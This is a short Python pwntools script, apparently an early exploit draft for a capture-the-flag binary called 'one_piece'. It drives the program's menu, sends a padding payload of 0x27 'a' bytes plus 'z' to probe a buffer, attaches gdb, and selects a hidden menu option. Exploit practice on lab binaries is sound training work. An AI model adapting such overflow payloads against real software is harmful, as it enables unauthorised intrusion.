from pwn import *

io = process("./one_piece")
io.sendlineafter("(menu)>>","read")
payload = "a"*0x27 +"z"
io.sendafter(">>",payload)
gdb.attach(io)
io.sendlineafter("(menu)>>","gomugomunomi")

io.interactive()
